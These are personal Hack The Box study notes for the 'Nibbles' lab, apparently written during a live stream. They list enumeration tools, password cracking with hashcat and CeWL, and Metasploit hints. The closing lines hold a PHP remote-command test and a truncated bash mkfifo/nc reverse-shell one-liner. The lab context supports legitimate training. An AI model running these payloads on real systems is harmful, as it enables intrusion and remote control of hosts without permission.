# HTB Pentration Testing Notes
* Notes were written live on Twitch, X, YT, and Kick at @ChaosFoundry
X: @Archknight
## Nibbles - HTB Getting Started 
### Important commands

nmap
-sV Service Enum
sudo -l - checks what commands your remote user can use

scp - secure copy

known exploit for nibbleblog - built with PHP (check metasploit with
msf exploit db)
gobuster is an enum tool, specifically for web service targets.

 gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist
 /usr/share/seclists/Discovery/Web-Content/common.txt
https://github.com/OJ/gobuster

For chat's reference, ``` [ctrl+shift]+V ``` and ``` [ctrl+shift]+C ```
are for copy and pasta on Terminals in Linux. On windows, regular c+p
are a thing, so no worries.

Nibbles instance may have readme at curl IP/nibbleblog/README

Metasploit again has a module for this nibbles thing. Sounds like nibbles
is shit.

xmlint can be piped to to fix output of found xml documents.
command is ```  curl -s http://IP/nibbleblog/content/priv/users.xml | xmlint --for>
``` hashcat `` is one way to get a password by trying to crack it
``` https://github.com/digininja/CeWL  ```

PHP RCE test: ``` <?php system('id'); ?> ```
RevShell CheatSheet: ``` https://swisskyrepo.github.io/InternalAllTheThings/cheats>
``` https://highon.coffee/blog/reverse-shell-cheat-sheet/ ```
 BASH REV SHELL '' Hawt ''  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc >
